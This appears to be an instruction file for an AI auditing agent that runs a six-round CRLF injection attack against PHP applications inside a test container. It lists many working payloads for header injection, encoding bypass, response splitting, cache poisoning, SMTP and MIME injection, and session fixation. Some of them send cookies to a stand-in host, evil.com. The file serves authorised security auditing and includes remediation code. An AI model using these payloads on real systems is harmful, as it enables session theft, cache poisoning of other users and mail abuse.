## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-056-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute 6-round progressive attack against CRLF injection sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 6 attack rounds — if stuck after round 4, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploits/{sink_id}.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST verify injected header appears in HTTP response headers (not body) — `%0d%0a` in response body is URL-encoded echo, not CRLF injection | FAIL — body reflection falsely reported as header injection |

## 6 Rounds of Attack


#### R1 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R1 - Basic CRLF Injection

Objective: Test newline character injection in HTTP header values to determine whether the application filters `\r\n`.

**header() Injection Payloads:**
- `value%0d%0aX-Injected:%20true` — URL-encoded `\r\n` injecting a custom header
- `value\r\nX-Injected: true` — Raw `\r\n` literal injection
- `value%0aX-Injected:%20true` — LF-only (`\n`) injection (accepted by some servers)
- `value%0dX-Injected:%20true` — CR-only (`\r`) injection

**Location Redirect Payloads:**
- `http://example.com%0d%0aX-Injected:%20true` — Injecting headers in redirect URL
- `/%0d%0aSet-Cookie:%20evil=1` — Injecting Cookie via Location
- `/redirect%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK` — Preliminary response splitting probe

**setcookie() Payloads:**
- Cookie name: `test%0d%0aX-Injected:%20true`
- Cookie value: `val%0d%0aSet-Cookie:%20evil=pwned`
- Cookie path: `/%0d%0aX-Injected:%20true`
- Cookie domain: `.evil.com%0d%0aX-Injected:%20true`

**Custom Header Payloads:**
- `custom-value%0d%0aX-Injected:%20true` — Test in any header() call that accepts user input

Inject the above payloads into all identified Sink parameters. Analyze whether `X-Injected: true` appears in response headers. Also check whether the server returns a 500 error (indicating newline characters were passed to the header layer but triggered an error).

**Evidence:** `X-Injected: true` appears in response headers, or the server returns an error due to illegal headers.


#### R2 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R2 - Encoding Bypass

Objective: Bypass application-layer `\r\n` filters through various encoding methods.

**Double URL Encoding:**
- `%250d%250a` — If the application URL-decodes before passing to header()
- `%250d%250aX-Injected:%2520true`
- `%%0d0d%%0a0a` — Malformed double encoding

**Unicode Encoding:**
- `\u000d\u000a` — Unicode CR+LF
- `\u010d\u010a` — Non-standard Unicode control characters (some parsers map to CR/LF)
- `%c0%8d%c0%8a` — UTF-8 overlong encoding of CR(0x0D) and LF(0x0A)
- `%e0%80%8d%e0%80%8a` — Three-byte UTF-8 overlong encoding

**Mixed Encoding:**
- `%0d` + literal `\n` — Mixed URL encoding and literals
- `\r` + `%0a` — Reverse mix
- `%0d` + `%0a` injected into different parameters separately (split injection)

**Null Byte Prefix:**
- `%00%0d%0a` — Null byte may truncate filter checks
- `%0d%00%0a` — Null byte inserted between CR and LF
- `\0\r\n` — Raw null byte

**HTML Entity Encoding:**
- `&#13;&#10;` — If the application parses HTML entities before concatenating into headers
- `&#x0d;&#x0a;` — Hexadecimal HTML entities

**Wide Byte Injection (GBK/Shift_JIS environments):**
- `%bf%0d%bf%0a` — Wide byte consuming the preceding byte to bypass analysis
- `%8f%0d%8f%0a` — Shift_JIS multi-byte prefix

Test the decoding order of each encoding before and after the filter. Some frameworks perform an additional URL decode after the security check, giving double encoding an opportunity to exploit.

**Evidence:** Successfully injecting a new header via alternative encoding (`X-Injected: true` appears in response headers).


#### R3 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R3 - HTTP Response Splitting

Objective: Achieve response splitting by injecting a complete HTTP response, controlling the browser to render attacker-controlled response content.

**Basic Response Splitting:**
```
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>
```

**Content-Length Truncation:**
```
%0d%0aContent-Length:%200%0d%0a%0d%0a
```
- Set the original response body length to 0, causing the browser to ignore subsequent normal content
- The browser may treat the next HTTP response as the response to a new request

**Script Injection (XSS via Response Splitting):**
```
%0d%0a%0d%0a<html><body><script>document.location='http://evil.com/?c='+document.cookie</script></body></html>
```

**Multiple Set-Cookie Injection:**
```
%0d%0aSet-Cookie:%20session=attacker_controlled;%20Path=/;%20HttpOnly
%0d%0aSet-Cookie:%20admin=true;%20Path=/
%0d%0aSet-Cookie:%20PHPSESSID=fixated_session_id;%20Path=/
```

**Transfer-Encoding Smuggling:**
```
%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a
```
- Inject `Transfer-Encoding: chunked` to cause the backend to misparse request boundaries
- Combined with a front-end proxy to achieve HTTP Request Smuggling

**Targeting Different HTTP Versions:**
- HTTP/1.0: No `Transfer-Encoding`, use `Content-Length` truncation
- HTTP/1.1: Supports chunked encoding, can inject `Transfer-Encoding`
- HTTP/2: Pseudo-headers (`:status`, `:path`) do not allow CR/LF, but downgrade to HTTP/1.1 may introduce them

**Evidence:** Attacker-injected HTML/JS content appears in the response body, or the browser renders a complete response page controlled by the attacker.


#### R4 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R4 - Cache Poisoning

Objective: Exploit CRLF injection to tamper with cache-related headers, poisoning CDN/reverse proxy caches to affect other users.

**X-Forwarded-Host Injection:**
```
%0d%0aX-Forwarded-Host:%20evil.com
```
- If the application uses `X-Forwarded-Host` to generate absolute URLs (e.g., resource links, redirect targets)
- Cached pages will contain links pointing to `evil.com`
- Subsequent users accessing cached pages are redirected to the attacker's server

**Cache-Control Injection:**
```
%0d%0aCache-Control:%20public,%20max-age=31536000
```
- Mark private/dynamic content as publicly cacheable
- Pages containing Session Tokens are cached, allowing other users to obtain them

**Vary Header Manipulation:**
```
%0d%0aVary:%20X-Evil-Header
```
- Manipulate the cache key, causing the cache to store different responses for different `X-Evil-Header` values
- Combined with CRLF injection, the cache can store attacker-manipulated responses

**CDN Cache Poisoning Chain:**
1. Inject `X-Forwarded-Host: evil.com` to make the application generate HTML containing `evil.com`
2. Simultaneously inject `Cache-Control: public, max-age=604800` to force caching
3. CDN caches the poisoned response
4. All subsequent users receive pages with resource links to `evil.com`

**ETag Manipulation:**
```
%0d%0aETag:%20"evil-etag-value"
```
- Inject a custom ETag value
- Combined with `If-None-Match`, the cache can continue returning stale/tampered content

**Reverse Proxy Specifics:**
- Varnish: Look for `X-Varnish`, `Via` headers to confirm cache layer presence
- Nginx: `X-Cache-Status` / `X-Proxy-Cache`
- Cloudflare: `CF-Cache-Status`
- Use cache buster parameters (e.g., `?cb=random`) to confirm caching behavior

```
# Steps to verify cache poisoning
1. Send a request with CRLF payload (including cache buster)
2. Remove the cache buster and send a clean request
3. Check whether the clean request's response contains injected headers/content
4. If present → cache poisoning confirmed
```

**Evidence:** A clean request without payload returns tampered cached content (containing injected headers or modified response body).


#### R5 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R5 - Mail Header Injection

Objective: Inject additional mail headers through the `additional_headers` parameter of the `mail()` function to achieve mail abuse.

**CC/BCC Recipient Injection:**
```php
// User input: "user@example.com\r\nBCC: attacker@evil.com"
mail($to, $subject, $body, "From: " . $_POST['email']);
```
- `From: user@example.com\r\nBCC: attacker@evil.com` — Add blind carbon copy
- `From: user@example.com\r\nCC: attacker@evil.com` — Add carbon copy
- `From: user@example.com%0d%0aBCC:%20attacker@evil.com` — URL-encoded variant

**Payload List:**
- `user@example.com%0d%0aBCC:%20attacker@evil.com` — Inject BCC
- `user@example.com%0d%0aCC:%20attacker@evil.com` — Inject CC
- `user@example.com%0d%0aTo:%20another@victim.com` — Inject additional recipients
- `user@example.com%0d%0aSubject:%20Phishing%20Alert` — Tamper with email subject

**Content-Type Tampering:**
```
user@example.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Phishing</h1><a href="http://evil.com">Click here</a>
```
- Convert plain text email to HTML email
- Inject HTML phishing content

**SMTP Command Injection:**
```
user@example.com%0d%0a%0d%0a.%0d%0aMAIL FROM:<attacker@evil.com>%0d%0aRCPT TO:<victim@target.com>%0d%0aDATA%0d%0aSubject: Spoofed%0d%0a%0d%0aSpoofed body%0d%0a.
```
- Terminate the current email with `\r\n.\r\n` and start a new SMTP transaction
- Send a second email entirely controlled by the attacker

**MIME Boundary Manipulation:**
```
user@example.com%0d%0aContent-Type: multipart/mixed; boundary="EVIL"%0d%0a%0d%0a--EVIL%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>%0d%0a--EVIL%0d%0aContent-Type: application/octet-stream%0d%0aContent-Disposition: attachment; filename="malware.exe"%0d%0a%0d%0aMZ...%0d%0a--EVIL--
```
- Inject MIME boundary to convert the email to multipart
- Add malicious attachments or HTML content parts

**Detecting Whether Email Was Actually Sent:**
- Use a controlled SMTP server or tools like MailHog/Mailpit to capture emails
- Locate the `Received` header chain in the email raw source
- Inject `X-Mailer: CRLF-Test` as a detection marker

**Evidence:** BCC email received via controlled mailbox, or the email raw headers contain an injected `Content-Type: text/html` with HTML content.


#### R6 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R6 - Advanced Combination Attacks

Objective: Chain CRLF injection with other vulnerability types to achieve higher-impact attacks.

**CRLF → XSS Chain:**
```
# Inject JS via response splitting
%0d%0a%0d%0a<script>document.location='http://evil.com/?c='+document.cookie</script>

# Inject Content-Type to make browser render HTML
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img src=x onerror=alert(document.domain)>
```
- Bypass CSP: If CSP is set via headers, CRLF can inject a new CSP (overriding or appending `unsafe-inline`)
- `%0d%0aContent-Security-Policy:%20script-src%20'unsafe-inline'%0d%0a%0d%0a<script>alert(1)</script>`

**CRLF → Session Fixation:**
```
# Inject Set-Cookie to fix Session ID
%0d%0aSet-Cookie:%20PHPSESSID=attacker_known_session_id;%20Path=/;%20HttpOnly

# Inject multiple Cookies to override existing values
%0d%0aSet-Cookie:%20PHPSESSID=evil;%20Path=/;%20Domain=.target.com
%0d%0aSet-Cookie:%20remember_token=forged_value;%20Path=/
```
Attack flow:
1. Attacker injects a fixed Session ID into the victim via CRLF
2. Victim logs in using that Session ID
3. Attacker uses the same Session ID to obtain the victim's authenticated session

**CRLF → Open Redirect:**
```
# Inject/override Location header
%0d%0aLocation:%20http://evil.com/phishing%0d%0a%0d%0a

# Combined with Content-Length: 0 to truncate original response
%0d%0aContent-Length:%200%0d%0aLocation:%20http://evil.com%0d%0a%0d%0a
```

**CRLF in WebSocket Upgrade:**
```
# Inject headers in WebSocket handshake request
GET /ws?token=user%0d%0aSec-WebSocket-Protocol:%20evil HTTP/1.1
Upgrade: websocket
Connection: Upgrade

# If the token parameter is reflected in response headers
# Additional WebSocket sub-protocols can be injected or upgrade response tampered
```

**HTTP/2 CRLF Considerations:**
- HTTP/2 frame layer prohibits CR/LF in header fields (RFC 7540)
- But in HTTP/2 → HTTP/1.1 downgrade scenarios (reverse proxy), pseudo-headers are converted to HTTP/1.1 headers
- If downgrade does not strictly filter, CRLF may take effect after downgrade
- Test the `:authority` pseudo-header in `CONNECT` requests
- HPACK encoding does not prevent CRLF concatenated at the application layer

```
# HTTP/2 downgrade test
:method: GET
:path: /redirect?url=http://example.com%0d%0aX-Injected:%20true
:authority: target.com
```

**Multi-Stage Exploitation Chain Example:**
1. **Stage 1** — Achieve privilege escalation via CRLF injecting `Set-Cookie: admin=true`
2. **Stage 2** — Use the escalated Cookie to access the admin interface
3. **Stage 3** — Exploit file upload in the admin interface to achieve RCE

**Evidence:** The complete chain of the combination attack is confirmed — from initial CRLF injection to final impact (XSS execution / Session fixation / successful redirect / privilege escalation).

## Evidence Collection

During each attack round, the following evidence MUST be collected:

1. **Complete HTTP request** (raw request containing the injected payload)
2. **Complete HTTP response headers** (with injected header lines highlighted)
3. **HTTP response body** (if response splitting occurred, mark the split boundary)
4. **Timestamps** (precise to milliseconds, for cache poisoning sequence verification)
5. **Server behavior** (HTTP status code changes, error messages, abnormal response lengths)

For cache poisoning scenarios:
- Response from the initial request (with payload)
- Response from subsequent clean requests (confirming whether cache was poisoned)
- Cache header changes (`X-Cache`, `Age`, `Cache-Control`, `Pragma`, `Expires`, `Vary`)

For mail header injection scenarios:
- Email raw source (with complete headers)
- Recipient list confirmation
- MIME structure analysis

## Per-Round Record Format

```json
{
  "vuln_type": "CRLF_Injection",
  "sub_type": "header_injection|response_splitting|cache_poisoning|mail_header_injection|session_fixation",
  "round": 1,
  "endpoint": "GET /redirect?url=PAYLOAD",
  "sink_function": "header()",
  "parameter": "url",
  "payload": "%0d%0aX-Injected:%20true",
  "evidence": "X-Injected: true appeared in response headers",
  "confidence": "confirmed|highly_suspected|potential_risk",
  "impact": "HTTP response splitting|cache poisoning|session fixation|XSS|mail abuse",
  "remediation": "Filter \\r\\n characters from header values, use PHP 7.0+ built-in protection, use framework-provided secure header setting methods"
}
```

## Smart Skip

After round 4, a skip MAY be requested, but the following MUST be provided:
- List of attempted strategies (including specific payloads and results from each round)
- PHP version confirmation (PHP ≥ 7.0 has built-in header() multi-line check)
- Analysis conclusion on framework header wrapper mechanism (whether it bypasses PHP's native check)
- Reasoning for why subsequent strategies cannot bypass
- If PHP ≥ 7.0 and framework does not bypass native check → header()-related tests MAY be terminated early (but mail() scenarios MUST still be tested)

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate possible CRLF injection vulnerabilities:

- Pattern 1: `header("Location: " . $_GET['url'])` — User input directly concatenated into Location redirect header without newline filtering
- Pattern 2: `header("X-Custom: " . $userInput)` — User-controllable data concatenated into custom HTTP response headers
- Pattern 3: `setcookie($name, $value)` where `$name` or `$value` comes from user input — Cookie attributes can be injected with newline characters
- Pattern 4: `mail($to, $subject, $body, $headers)` where `$headers` contains user input — Mail additional headers can be injected with extra recipients or Content-Type tampering
- Pattern 5: `$response->header($key, $value)` with unvalidated `$value` in framework header setters — Framework wrappers may bypass PHP 7.0+'s native newline check
- Pattern 6: `header("Content-Disposition: attachment; filename=\"" . $_GET['filename'] . "\"")` — Filename parameter injection, can insert newline characters to split headers
- Pattern 7: `$url` parameter in redirect functions not sanitized for newline characters — `Response::redirect($url)`, `wp_redirect($url)`, `redirect()->to($url)`, `header("Location: $url")`, `HttpResponse::redirect($url)` (and similar redirect wrappers)
- Pattern 8: User input in log writing functions may contain `\r\n` — `error_log($userInput)`, `file_put_contents($logFile, $userInput)` leading to log forgery/injection

## Key Insight

> **Key Point**: The core of CRLF injection lies in the semantic meaning of newline characters at the HTTP protocol level. PHP's header() function checks for multi-line headers by default since PHP 7.0+, but many framework wrappers bypass this check. Focus on older PHP versions (<7.0) and framework header wrapper methods. Additionally, the `additional_headers` parameter of the `mail()` function is not protected by this check in any PHP version and remains a high-value CRLF injection target. During auditing, three levels MUST be distinguished: (1) PHP native header()'s version differences; (2) whether the framework's Response class calls native header(); (3) independent risks in non-HTTP-header scenarios (mail, logs).

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger Smart Pivot:

1. Re-reconnaissance: Re-read target code to find missed filtering logic and alternative entry points
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for related findings from other experts
3. Decision tree matching: Select new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. PHP version analysis: Confirm target PHP version — header() does not check newlines in PHP < 7.0, revert to R1 strategy
5. Framework layer analysis: Analyze whether the framework's Response class directly calls native header() or assembles and outputs headers through other means
6. Sink switching: If the header() path is completely blocked, switch to mail() additional_headers or log injection
7. When no new paths exist, terminate early to avoid wasting rounds and producing hallucinated results

## Prerequisites and Scoring (MUST be completed)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for that route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` SHALL list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-dimensional scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-CRLF-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_CRLF_INJECTION_POINT` — header()/setcookie()/mail() call location (file:line) ✅ Required
- `EVID_CRLF_USER_INPUT_PATH` — Complete data flow from user input to header value ✅ Required
- `EVID_CRLF_SANITIZATION_STATUS` — Evidence of newline filtering/escaping mechanisms ✅ Required
- `EVID_CRLF_INJECTION_RESPONSE` — HTTP response showing successful injection (with injected headers/split response body) Required when confirmed

Missing required EVIDs → conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write

After the attack cycle ends, write experiences to the attack memory store (see `shared/attack_memory.md` write protocol for format):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write. SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write the final results to `$WORK_DIR/exploits/{sink_id}.json`, following the format in `shared/data_contracts.md` Section 9 (`exploit.json`).

> The `## Per-Round Record Format` above is the per-round internal record format; the final output MUST be aggregated into the exploit.json structure.

## Real-Time Sharing and Second-Order Tracking

### Shared Write
When the following information is discovered, it **MUST** be written to the shared findings store (`$WORK_DIR/audit_session.db`):
- Successful CRLF injection points → `finding_type: crlf_injection_point`
- XSS achieved via response splitting → `finding_type: xss` (notify XSS auditor)
- Set-Cookie injected via CRLF (Session Fixation) → `finding_type: session_fixation` (notify privilege escalation auditor)
- Mail header injection available → `finding_type: mail_injection` (notify information disclosure auditor)
- Cache poisoning successful → `finding_type: cache_poisoning`

### Shared Read
Read the shared findings store before starting the attack phase, leveraging:
- PHP version information discovered by the configuration auditor (to determine if header() has native protection)
- Framework version discovered by the information disclosure auditor (to determine if framework header wrappers are secure)
- CSP header configuration discovered by the XSS auditor (to determine if response splitting XSS is limited by CSP)

### Second-Order Tracking
Record locations where user input is written to DB and later retrieved and concatenated into header():
- Storage points: `$WORK_DIR/second_order/store_points.jsonl` (e.g., username written to DB during registration)
- Usage points: `$WORK_DIR/second_order/use_points.jsonl` (e.g., response header contains username retrieved from DB)

Typical second-order CRLF scenario:
1. User enters a value containing `\r\n` on registration/profile page (e.g., username, notes)
2. Value is stored in the database (newline characters not filtered during storage)
3. In a subsequent request, the application retrieves the value from DB and concatenates it into an HTTP header (e.g., `X-User-Info` or log header)
4. Second-order CRLF injection triggers

## Constraints

- Sending payloads that may cause service disruption to production environments is PROHIBITED (e.g., mass `Transfer-Encoding` smuggling requests)
- Cache poisoning tests MUST use cache buster parameters for isolation to avoid affecting other users
- Mail header injection tests SHALL only send to controlled mailboxes; sending spam to real external addresses is PROHIBITED
- Each Sink is limited to a maximum of 6 rounds of testing; infinite loops are PROHIBITED
- Comply with the authorized scope; only test authorized targets
- Record all attempts to ensure audit trail integrity

## PHP Version Differences and header() Security Evolution

CRLF injection behavioral differences across PHP versions are the core judgment basis for this audit.

### PHP < 5.1.2

The `header()` function does not check newline characters at all; any `\r\n` is passed directly to the HTTP response:

```php
// PHP < 5.1.2 — Completely unprotected
header("Location: " . $_GET['url']);
// Input: http://example.com%0d%0aX-Injected: true
// Result: Two header lines appear in response headers
```

### PHP 5.1.2 ~ 5.4.x

`header()` begins issuing a Warning for multi-line headers, but still allows them through:

```php
// PHP 5.1.2+ — Warning but does not block
header("Location: " . $_GET['url']);
// Warning: Header may not contain more than a single header
// But the header is still sent (depends on PHP SAPI and web server)
```

### PHP 7.0+

`header()` strictly blocks header values containing `\r` or `\n` (throws Warning and refuses to set):

```php
// PHP 7.0+ — Strictly blocked
header("Location: http://example.com\r\nX-Injected: true");
// Warning: Header may not contain NUL bytes or newlines
// Header will not be sent
```

**However, the following scenarios still carry risk:**

```php
// 1. Framework bypass — Some frameworks do not output headers via header()
// Laravel's Response in certain versions uses Symfony HttpFoundation
// Need to check whether its sendHeaders() implementation calls native header()

// 2. mail() is not protected by this
mail($to, $subject, $body, "From: " . $_POST['email']);
// mail()'s additional_headers does not check for CRLF in any PHP version

// 3. setcookie() also checks newlines in PHP 7.0+
// But some edge cases (e.g., cookie value timing after urlencode then decode) may bypass

// 4. Raw output functions
// If the application uses echo/print to directly output HTTP headers (CGI mode), not protected by header()
echo "Status: 302\r\n";
echo "Location: " . $userInput . "\r\n";
echo "\r\n";
```

### Framework Header Wrapper Security

| Framework | Method | Calls native header()? | CRLF Risk |
|------|------|----------------------|-----------|
| Laravel (Symfony) | `$response->send()` | ✅ Eventually calls `header()` | Safe on PHP 7.0+ |
| ThinkPHP 5.x | `Response::send()` | ✅ Calls `header()` | Safe on PHP 7.0+ |
| ThinkPHP 3.x | `send_http_status()` | ⚠️ Partially uses direct echo | At risk |
| CodeIgniter 3 | `set_header()` | ✅ Calls `header()` | Safe on PHP 7.0+ |
| Slim 3/4 (PSR-7) | `emit()` | ✅ Calls `header()` | Safe on PHP 7.0+ |
| Custom framework | Unknown | ❓ Requires audit | Case-by-case analysis |
| CGI mode | Direct echo | ❌ Does not call `header()` | Always at risk |

### Key Insight

> PHP 7.0+'s `header()` newline check significantly reduces the attack surface for CRLF injection, but this does not mean CRLF injection is dead. Audit focus SHOULD shift to: (1) legacy PHP applications; (2) `mail()` function (unprotected in all versions); (3) custom frameworks or direct output in CGI mode; (4) HTTP/2→1.1 downgrade scenarios. Version information is the top priority reconnaissance target for CRLF auditing.

## Common Defense Bypass Techniques

### 1. Filter Only Checks `\r\n` Pair

```php
// ❌ Insecure filter — only removes \r\n pair
$value = str_replace("\r\n", "", $input);
header("X-Custom: " . $value);

// Bypass: Use standalone \r or \n
// Some web servers (e.g., older IIS) accept \n alone as header separator
// Input: "test\nX-Injected: true" → bypasses filter
```

### 2. Filter Executes Before Decoding

```php
// ❌ Filter first, then decode — double encoding bypass
$value = str_replace(["\r", "\n"], "", $input);
$value = urldecode($value); // Double-encoded %250d%250a is decoded to %0d%0a here
header("Location: " . $value);

// Fix: Decode first then filter, or filter at the final output point
```

### 3. Incomplete Blocklist

```php
// ❌ Only filters %0d%0a — misses other encodings
$value = str_replace(["%0d", "%0a", "%0D", "%0A"], "", $input);
header("X-Custom: " . $value);

// Bypass: \r\n literals, Unicode encoding, overlong UTF-8
// Input: Raw \r\n bytes (not URL-encoded) → bypasses str_replace
```

### 4. Correct Defense Approach

```php
// ✅ Correct approach 1 — Remove all control characters
$value = preg_replace('/[\x00-\x1f\x7f]/', '', $input);
header("X-Custom: " . $value);

// ✅ Correct approach 2 — Allowlist permitted characters
$value = preg_replace('/[^\x20-\x7e]/', '', $input);
header("Location: " . $value);

// ✅ Correct approach 3 — Use framework's secure methods
// Laravel
return redirect()->to($safeUrl); // Internally validated

// ✅ Correct approach 4 — mail() scenario
$email = filter_var($input, FILTER_VALIDATE_EMAIL);
if ($email !== false) {
    mail($to, $subject, $body, "From: " . $email);
}
```

> **Key Insight:** The core of defense bypass lies in understanding the filter's execution timing and coverage. The vast majority of successful bypass cases occur because: (1) filtering executes before decoding; (2) filtering is incomplete (only filters `\r\n` pair but not standalone `\r` or `\n`); (3) using a blocklist instead of an allowlist. During auditing, FIRST locate the filtering logic's position and implementation, THEN select the corresponding bypass strategy.


## Output Contract

| File | Path | Format |
|------|------|--------|
| Exploit result | `$WORK_DIR/exploits/{sink_id}.json` | JSON per `shared/data_contracts.md` §9 |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Python PoC |

## Examples

### ✅ GOOD Output Example

```json
{
  "sink_id": "CRLF-001",
  "vuln_type": "CRLF_Injection",
  "sub_type": "header_injection",
  "final_verdict": "confirmed",
  "rounds_executed": 2,
  "confirmed_round": 1,
  "endpoint": "GET /redirect?url=PAYLOAD",
  "sink_function": "header()",
  "parameter": "url",
  "payload": "%0d%0aX-Injected:%20true",
  "evidence": "EVID_CRLF_INJECTION_POINT: RedirectController.php:15 — header('Location: '.$_GET['url']); EVID_CRLF_USER_INPUT_PATH: $_GET['url'] → header() with no filtering; EVID_CRLF_SANITIZATION_STATUS: No str_replace or preg_replace for \\r\\n; EVID_CRLF_INJECTION_RESPONSE: Response headers contain 'X-Injected: true' on separate line",
  "confidence": "confirmed",
  "impact": "HTTP response header injection — can set arbitrary cookies or split response",
  "prerequisite_conditions": { "auth_requirement": "anonymous", "exploitability_judgment": "directly_exploitable" },
  "severity": { "reachability": 3, "impact": 2, "complexity": 3, "score": 2.55, "cvss": 8.5, "level": "H" }
}
```

### ❌ BAD Output Example

```json
{
  "sink_id": "CRLF-001",
  "vuln_type": "CRLF_Injection",
  "final_verdict": "confirmed",
  "evidence": "header() is used with user input",
  "severity": { "level": "H" }
}
// ❌ header() with user input is a pattern, not proof of exploitation
// ❌ No payload, no response showing injected header
// ❌ Missing EVID references
// ❌ PHP 7.0+ blocks CRLF in header() — version not checked
```


---

## Pre-Submission Self-Check (MUST be performed)

After completing the exploit JSON, perform item-by-item self-check per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); proceed only after all are ✅
2. Execute the specialized self-check items below (S1-S3); submit only after all are ✅
3. If any item is ❌ → correct and re-check; skipping is NOT permitted

### Specialized Self-Check (CRLF Auditor Specific)
- [ ] S1: Injection location (HTTP header/log/mail header) has been annotated
- [ ] S2: Complete payload from \r\n to header injection has been demonstrated
- [ ] S3: Combination exploitation with XSS/cache poisoning has been assessed

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Header injection payload sanitized by framework | Switch to double-encoding or Unicode variants; if all blocked → record `"waf_blocked": true` |
| Response headers not reflected in HTTP response | Verify injection via response splitting test; if no split → record `"status": "no_injection_point"` |
| Payload blocked by WAF/filter | Log filter type, switch to WAF-bypass payload variant; if all variants fail → record `"waf_blocked": true` |
